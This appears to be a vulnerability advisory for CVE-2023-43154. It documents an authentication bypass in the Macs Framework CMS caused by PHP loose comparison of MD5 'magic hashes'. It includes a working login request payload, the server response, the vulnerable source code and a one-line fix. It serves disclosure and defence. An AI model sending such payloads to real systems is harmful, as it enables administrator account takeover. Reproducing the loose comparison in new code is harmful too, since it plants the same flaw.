# CVE-2023-43154 - Macs Framework v1.1.4f CMS Type Confusion Vulnerability
## Table of Contents
1. [Overview](#overview)

3. [Technical Debrief](#technical-debrief)
4. [Mitigation](#mitigation)
## Overview
\*\*CVE-ID\*\*: CVE-2023-43154
\*\*CVSS 3.1\*\*: 9.8
\*\*Vulnerability Description\*\*: A loose comparison in the `isValidLogin()` function results in a PHP type confusion
vulnerability that can be abused to bypass authentication and takeover the administrator account.
\*\*Vulnerable Parameters\*\*: The username and password of the users on the CMS.
\*\*Affected Products\*\*: Macs Framework v1.14f - Content Management System
\*\*Limitations\*\*:
1. The username of the victim account must be previously known or a zero-like string
2. The password used with the account must result in a "magic hash".
\*\*User Interaction Required\*\*: None
\*\*References\*\*: [https://github.com/ally-petitt/CVE-2023-43154-PoC](https://github.com/ally-petitt/CVE-2023-43154-PoC)
\*\*Discovery Date\*\*: September 7, 2023
\*\*Reported By\*\*: Ally Petitt
## Proof of Concept
Logging in at the URI `/index.php/main/cms/login` with the username of the victim account and any
password that results in a magic hash will lead to authentication bypass.
A sample login is shown below.
### Send Payload
```
POST /index.php/main/cms/login HTTP/1.1
Host: 172.17.0.2
Content-Length: 62
Accept: \*/\*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Origin: http://172.17.0.2
Referer: http://172.17.0.2/index.php/main/cms/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=di4ceqcv9432vcb0p27rkh7k82
Connection: close
ajaxRequest=true&&username=testadmin&password=0gdVIdSQL8Cm&scrollPosition=0
```
### HTTP Response
```
HTTP/1.1 200 OK
Date: Sat, 09 Sep 2023 02:01:26 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/5.6.40
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 72
Connection: close
Content-Type: text/html; charset=ISO-8859-1
<script>window.location.href="http://172.17.0.2/index.php/home"</script>
```
The status code of 200 and the redirect to `/index.php/home` are both indications that the login attempt
was successful. The password of `testadmin` was not the password used in the login attempt (`0gdVIdSQL8Cm`).
Instead, it was set to `QNKCDZO`.
## Technical Debrief
When a user attempts to log in, their supplied password is hashed and and sent as a parameter to
the `isValidLogin()` function via the initial `login()` function that is called when a POST request
is made to `/index.php/Main/CMS/login`.
```
public function login()
{
if($this->isValidLogin(Post::getByKey('username'), $this->encrypt(Post::getByKey('password')) ) || ( $this->isAdminLoggedIn() ))
--snip--
}
```
The `isValidLogin()` function begins on line 83 of file `/Application/plugins/CMS/controllers/CMS.php`.
It is vulnerable to a type confusion vulnerability due to its use of 2 equal signs instead of 3.
```
private function isValidLogin($username, $password)
{
$this->loadModels();
$loggedIn = false;
foreach (Config::$editInPlaceAdmins as $key=>$account)
{
if(( $account['username'] == $username) && ($account['password'] == $password ) )
{
$loggedIn = true;
Session::set('AdminLoggedIn', $account);
break;
}
}
```
As shown in the `if` statement, the username and password are being checked with a loose comparison, leading
to a PHP type confusion vulnerability. This can be abused when logging in with a password that results in a
magic hash, or hash that is interpretted by PHP to have the value `0` during a loose comparison. A list of such
passwords can be found [here](https://github.com/spaze/hashes).
To exploit this, it is important to first understand the format that `$account['password']` is stored in.
In the function used to save a new user account on line 730 of the aforementioned `CMS.php` file, it becomes
clear that the password is first passed through an `encrypt` function before it is stored.
```
$password = $this->encrypt(Post::getByKey('password'));
$confirmPassword = $this->encrypt(Post::getByKey('confirmPassword'));
-- snip --
private function saveNewUser( $username, $password, $emailAddress, $roleId)
```
Continuing to the function that is called after the password is run through `encrypt`, the following
code is used:
```
private function saveNewUser( $username, $password, $emailAddress, $roleId)
{
--snip--
$this->usersModel->insertUser($username, $password, $emailAddress, $roleId);
--snip--
}
```
Based on the code above, it is apparent that the "encrypted" password was placed directly into the
`users` Model of the MVC framework. Finally, to exploit this vulnerability, it is necessary to understand
how the `encrypt` function works as its output is being directly compared against the user input.
```
private function encrypt( $string )
{
return md5($string);
}
```
The encrypt function returns the MD5 hash of the string passed to it. This means that when the `login()`
function is called with the user-supplied credentials, the inputted password is hashed and compared against
the stored MD5 hash of the victim account.
The implication is that when using a password that results in a PHP collision, or magic hash, it will register
as being equivilent when compared against a stored password that also follows the format of a magic hash.
As a result, a very large number of passwords can be used to authenticate to and takeover the administrator
account, even when the initial password is not previously known.
## Mitigation
This vulnerability can be mitigated by changing the loose comparison in the `isValidLogin()` function
to a strict comparison by replacing `==` with `===`.
